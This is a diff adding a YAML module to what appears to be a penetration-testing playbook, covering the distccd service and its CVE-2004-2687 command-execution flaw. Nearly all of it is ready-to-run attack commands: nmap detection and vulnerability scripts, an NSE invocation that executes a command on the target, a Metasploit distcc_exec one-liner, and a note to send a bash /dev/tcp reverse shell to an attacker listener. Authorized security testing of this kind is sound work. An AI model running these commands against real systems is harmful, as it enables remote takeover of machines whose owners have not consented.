@@ -1,0 +1,40 @@
+module: distcc
+name: distcc (3632)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / distccd daemon
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_check
+        text: Command execution CVE-2004-2687 check
+        commands: |
+          nmap -p$PORT --script=distcc-cve2004-2687 $IP
+          searchsploit distcc
+
+  - id: exploit
+    name: Command Execution
+    authorized: true
+    steps:
+      - id: nse_exec
+        text: RCE via NSE (runs a command directly)
+        commands: |
+          nmap -p$PORT --script=distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" $IP
+      - id: msf
+        text: RCE via Metasploit
+        commands: |
+          msfconsole -qx "use exploit/unix/misc/distcc_exec; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: revshell
+        text: Get a reverse shell (feed a payload as the command)
+        manual: true
+        commands: |
+          # set the NSE/msf cmd to a bash /dev/tcp reverse shell to <LHOST>:<LPORT>
